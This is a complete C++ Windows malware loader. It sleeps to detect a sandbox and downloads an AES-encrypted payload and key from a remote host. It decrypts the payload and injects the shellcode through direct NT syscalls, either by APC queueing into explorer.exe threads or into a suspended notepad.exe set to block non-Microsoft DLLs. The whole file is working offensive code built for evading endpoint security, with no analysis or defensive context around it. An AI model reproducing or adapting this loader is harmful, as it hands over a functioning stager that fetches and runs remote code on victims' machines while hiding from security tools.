#include <Ws2tcpip.h>
#include <Windows.h>
#include <winhttp.h>
#include <TlHelp32.h>
#include <ntstatus.h>
#include "syscalls_all.h"
#include <iostream>
#include <vector>
#include <chrono>
#include <thread>
#include <iomanip>
#include <ctype.h>
#include <algorithm>

#pragma comment(lib, "winhttp")
#pragma comment( lib, "Ws2_32.lib" )

struct DATA {
	LPVOID data;
	size_t len;
};

void checkSandbox() {
	auto start = std::chrono::system_clock::now();
	std::this_thread::sleep_for(std::chrono::seconds(5));
	auto end = std::chrono::system_clock::now();
	std::chrono::duration<double> actualElapsedSec = end - start;
	if (actualElapsedSec.count() <= 4.5)
		exit(0);
}

DATA download(char* host, int port, char* resource) {
	DATA out;
	WSADATA wsaData;
	SOCKET sockfd;

	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		std::cerr << "[-] Error initializing winsock: " << iResult << std::endl;
		goto Cleanup;
	}

	sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sockfd == INVALID_SOCKET) {
		std::cerr << "[-] Error creating socket: " << std::endl;
		goto Cleanup;
	}
	struct sockaddr_in serv_addr;
	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(port);

	if (inet_pton(AF_INET, host, &serv_addr.sin_addr) != 1) {
		std::cerr << "[-] Error converting IP address" << std::endl;
		goto Cleanup;
	}
	if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
		std::cerr << "[-] Error connecting to server" << std::endl;
		goto Cleanup;
	}
	{
		std::string request = "GET /";
		request.append(resource);
		request.append(" HTTP/1.1\r\n\r\n");
		int num_bytes = send(sockfd, request.c_str(), request.size(), 0);
		std::vector<unsigned char> data;
		char buffer[512];
		while ((num_bytes = recv(sockfd, buffer, sizeof(buffer), 0)) > 0) {
			data.insert(data.end(), buffer, buffer + num_bytes);
		}
		std::cout << "[*] Received " << data.size() << " bytes" << std::endl;

		std::vector<unsigned char> justData;
		std::vector<unsigned char>::iterator it = std::search(data.begin(), data.end(), "\r\n\r\n", "\r\n\r\n" + 4);
		if (it != data.end()) {
			std::vector<unsigned char> data_only(it + 4, data.end());
			justData = data_only;
		}
		else {
			std::cerr << "[-] Error parsing HTTP response" << std::endl;
		}
		size_t size = justData.size();
		char* bufdata = (char*)malloc(size);
		for (int i = 0; i < size; i++) {
			bufdata[i] = justData[i];
		}
		out.data = bufdata;
		out.len = size;
		goto Cleanup;
	}
Cleanup:
	if (sockfd)
		closesocket(sockfd);
	WSACleanup();
	return out;
}

VOID procInjectionMethod1(char* payload, DWORD dwPayloadLen) {
	// Pointer to beginning of memory that will be used for shellcode
	LPVOID startAllocation;
	// Shellcode size for memory allocation
	SIZE_T allocationSize = dwPayloadLen;

	// Handles to thread and process we will inject into
	HANDLE hThread;
	HANDLE hProcess;

	// Take a snapshot of currently running processes. We need this to find the PID of explorer.exe
	// Explorer.exe gets chosen because it's possible hide large amounts of shellcode in it, as well
	// as its frequency of use.
	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	PROCESSENTRY32 processEntry{ sizeof(PROCESSENTRY32) };
	// Variable to store explorer.exe's PID
	DWORD dwPID;

	// Locate explorer.exe
	if (Process32First(hProcessSnapshot, &processEntry)) {
		while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
			Process32Next(hProcessSnapshot, &processEntry);
		}
	}
	// Store its PID
	dwPID = processEntry.th32ProcessID;

	// Get the values we need for NT syscalls
	OBJECT_ATTRIBUTES ProcessAttributes;
	InitializeObjectAttributes(&ProcessAttributes, NULL, NULL, NULL, NULL);

	CLIENT_ID ProcessClientID;
	ProcessClientID.UniqueProcess = (PVOID)processEntry.th32ProcessID;
	ProcessClientID.UniqueThread = (PVOID)0;

	// These syscalls will be made using SysWhispers3
	startAllocation = nullptr;
	NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &ProcessAttributes, &ProcessClientID);
	NtAllocateVirtualMemory(hProcess, &startAllocation, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	NtWriteVirtualMemory(hProcess, startAllocation, payload, dwPayloadLen, 0);

	// Place every thread of explorer.exe in threadIDs. We will use this to assign each an 
	// Asynchonous Procedural Call (APC), insert the shellcode, then resume the thread, executing our shellcode.
	// Not all instances of explorer.exe are necessary though, so we'll set a limit
	THREADENTRY32 threadEntry{ sizeof(THREADENTRY32) };
	std::vector<DWORD> threadIDs;
	if (Thread32First(hProcessSnapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
				threadIDs.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(hProcessSnapshot, &threadEntry));
	}

	// For each threadID, inject our shellcode using the QueueAPC method. Once the number of threads injected
	// hits 3, stop.
	int numThreads = 0;
	for (DWORD ID : threadIDs) {

		OBJECT_ATTRIBUTES tObjectAttributes;
		InitializeObjectAttributes(&tObjectAttributes, NULL, NULL, NULL, NULL);

		CLIENT_ID tClientId;
		tClientId.UniqueProcess = (PVOID)dwPID;
		tClientId.UniqueThread = (PVOID)ID;

		NtOpenThread(&hThread, MAXIMUM_ALLOWED, &tObjectAttributes, &tClientId);
		NtSuspendThread(hThread, NULL);
		NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)startAllocation, startAllocation, NULL, NULL);
		NtResumeThread(hThread, NULL);
		numThreads++;

		if (numThreads == 3) {
			break;
		}
	}
}

VOID procInjectionMethod2(char* payload, DWORD dwPayloadLen) {
	NTSTATUS status;
	LPVOID startAllocation;
	SIZE_T allocationSize = dwPayloadLen;
	PROCESS_INFORMATION procInfo = {};
	STARTUPINFOEXA startupInfo = {};
	SIZE_T attributeSize = 0;
	DWORD dwOldProtect;
	DWORD64 dwPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	PPROC_THREAD_ATTRIBUTE_LIST attributes = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY, attributeSize);
	InitializeProcThreadAttributeList(attributes, 1, 0, &attributeSize);

	UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &dwPolicy,
		sizeof(DWORD64), NULL, NULL);
	startupInfo.lpAttributeList = attributes;

	if (!CreateProcessA((LPSTR)"C:\\Windows\\System32\\notepad.exe",
		NULL, NULL, NULL, EXTENDED_STARTUPINFO_PRESENT, CREATE_SUSPENDED | CREATE_NO_WINDOW,
		NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&startupInfo), &procInfo)) {
		std::cerr << "[-] Process not created " << std::hex << GetLastError() << std::endl;
	}
	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, attributes);

	startAllocation = VirtualAllocExNuma(procInfo.hProcess, NULL, allocationSize,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0);

	status = NtWriteVirtualMemory(procInfo.hProcess, startAllocation, (PVOID)payload, allocationSize, nullptr);
	if (status != STATUS_SUCCESS) {
		std::cerr << "[-] Could not write to memory " << std::hex << status << std::endl;
	}

	status = NtProtectVirtualMemory(procInfo.hProcess, &startAllocation, &allocationSize,
		PAGE_EXECUTE_READ, &dwOldProtect);

	if (status != STATUS_SUCCESS) {
		std::cerr << "[-] Could not write to memory " << std::hex << status << std::endl;
	}

	NtQueueApcThread(procInfo.hThread, (PKNORMAL_ROUTINE)startAllocation, NULL, NULL, NULL);
	NtResumeThread(procInfo.hThread, 0);
}

BOOL decryptAES(char* shellcode, DWORD dwShellcodeLen, char* key, DWORD keyLen) {
	HCRYPTPROV hCryptProv = NULL;
	HCRYPTKEY hKey = NULL;
	HCRYPTHASH hHash = NULL;

	const char* stage = "init";
	BOOL success = TRUE;

	if (success) {
		stage = "CryptAcquireContextW";
		success = CryptAcquireContextW(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	}

	if (success) {
		stage = "CryptCreateHash";
		success = CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash);
	}

	if (success) {
		stage = "CryptHashData";
		success = CryptHashData(hHash, (BYTE*)key, keyLen, 0);
	}

	if (success) {
		stage = "CryptDeriveKey";
		success = CryptDeriveKey(hCryptProv, CALG_AES_256, hHash, 0, &hKey);
	}

	if (success) {
		stage = "CryptDecrypt";
		success = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &dwShellcodeLen);
	}

	if (!success) {
		std::cerr << "[-] Error in stage " << stage << " with error " << std::hex << GetLastError();
		return FALSE;
	}
	// Cleanup
	CryptReleaseContext(hCryptProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return TRUE;
}

int main(int argc, char** argv) {

	if (argc != 5) {
		std::cout << "[*] Usage: " << argv[0] << " <host> <port> <binary.enc> <aes.key>" << std::endl;
		return 1;
	}

	char* host = argv[1];
	DWORD port = atoi(argv[2]);
	char* binFile = argv[3];
	char* keyFile = argv[4];

	// Sleep for several seconds, then check if sandbox fast-fowarded sleep
	// If so, exit. If not, continue
	checkSandbox();

	// Decrypt shellcode

	DATA key = download(host, port, keyFile);
	char* aesKey = (char*)key.data;
	DATA bin = download(host, port, binFile);
	char* payload = (char*)bin.data;

	//char aesKey[] = { };
	//char payload[] = { };

	decryptAES(payload, bin.len, aesKey, key.len);

	//Take your pick of process injection method
	procInjectionMethod1(payload, bin.len);
	
	return 0;
}